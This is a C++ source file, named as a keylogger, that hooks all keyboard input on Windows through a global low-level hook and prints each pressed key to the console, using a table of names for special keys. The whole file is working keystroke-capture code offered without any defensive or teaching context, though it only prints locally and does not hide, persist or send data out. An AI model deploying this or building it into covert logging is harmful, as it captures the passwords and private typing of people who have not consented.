// keylogger_new.cpp
// this has smaller code but 4 times the exe size

#include <windows.h>
#include <iostream>
#include <unordered_map>
#include <string>

HHOOK _k_hook;

// Lookup map for keys with non-standard or custom names
const std::unordered_map<DWORD, std::string> key_names = {
    { VK_LMENU, "Left Alt" }, { VK_RMENU, "Right Alt" }, { VK_ESCAPE, "ESC" },
    { VK_TAB, "TAB" },       { VK_RETURN, "RETURN" },  { VK_LBUTTON, "LBUTTON" },
    { VK_RBUTTON, "RBUTTON" },{ VK_MBUTTON, "MBUTTON" },{ VK_BACK, "BACK" },
    { VK_SHIFT, "SHIFT" },   { VK_RSHIFT, "RSHIFT" },  { VK_LSHIFT, "LSHIFT" },
    { VK_CONTROL, "CONTROL" },{ VK_LCONTROL, "LCONTROL" }, { VK_RCONTROL, "RCONTROL" },
    { VK_CAPITAL, "CAPITAL" },{ VK_SPACE, "SPACE" },   { VK_PRIOR, "Page Up" },
    { VK_NEXT, "Page Down" }, { VK_HOME, "HOME" },     { VK_END, "END" },
    { VK_DOWN, "DOWN" },     { VK_UP, "UP" },         { VK_LEFT, "LEFT" },
    { VK_RIGHT, "RIGHT" },   { VK_INSERT, "INSERT" },  { VK_DELETE, "DELETE" },
    { VK_LWIN, "LWin" },     { VK_SLEEP, "Sleep" },    { VK_MULTIPLY, "MULTIPLY" },
    { VK_ADD, "ADD" },       { VK_SUBTRACT, "SUBTRACT" },{ VK_DECIMAL, "DECIMAL" },
    { VK_DIVIDE, "DIVIDE" }, { VK_NUMLOCK, "NUMLOCK" }, { VK_SCROLL, "SCROLL" },
    { VK_VOLUME_MUTE, "VK_VOLUME_MUTE" }, { VK_VOLUME_DOWN, "VK_VOLUME_DOWN" },
    { VK_VOLUME_UP, "VK_VOLUME_UP" },     { VK_MEDIA_PLAY_PAUSE, "VK_MEDIA_PLAY_PAUSE" },
    { VK_MEDIA_NEXT_TRACK, "VK_MEDIA_NEXT_TRACK" }, { VK_MEDIA_PREV_TRACK, "VK_MEDIA_PREV_TRACK" },
    { VK_OEM_COMMA, "VK_OEM_COMMA" },     { VK_OEM_3, " ` " }, { VK_OEM_4, " [ " },
    { VK_OEM_6, " ] " },     { VK_OEM_1, " ; " },      { VK_OEM_8, " \\ " },
    { VK_OEM_7, " ' " },     { 0xBB, "=" },            { 0xBE, "." },
    { 0xBD, "-" },           { 0xE2, "<" }
};

LRESULT __stdcall k_Callback1(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
    {
        PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
        DWORD vk = key->vkCode;

        // 1. Letters A-Z ('A' pressed ... 'Z' pressed)
        if (vk >= 'A' && vk <= 'Z') {
            printf("%c pressed\n", (char)vk);
        }
        // 2. Numbers 0-9
        else if (vk >= '0' && vk <= '9') {
            printf("%c\n", (char)vk);
        }
        // 3. Numpad numbers (VK_NUMPAD0 to VK_NUMPAD9)
        else if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
            printf("NUMPAD%d pressed\n", vk - VK_NUMPAD0);
        }
        // 4. Function keys (VK_F1 to VK_F12)
        else if (vk >= VK_F1 && vk <= VK_F12) {
            printf("F%d pressed\n", vk - VK_F1 + 1);
        }
        // 5. Mapped special keys
        else if (auto it = key_names.find(vk); it != key_names.end()) {
            // Check if name should have "pressed" appended based on original logic
            if (it->second.find(' ') == std::string::npos && it->second.length() > 1 && it->second[0] != 'V') {
                printf("%s pressed\n", it->second.c_str());
            } else {
                printf("%s\n", it->second.c_str());
            }
        }
        else {
            puts(" ");
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    _k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, k_Callback1, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (_k_hook)
        UnhookWindowsHookEx(_k_hook);
    return TRUE;
}
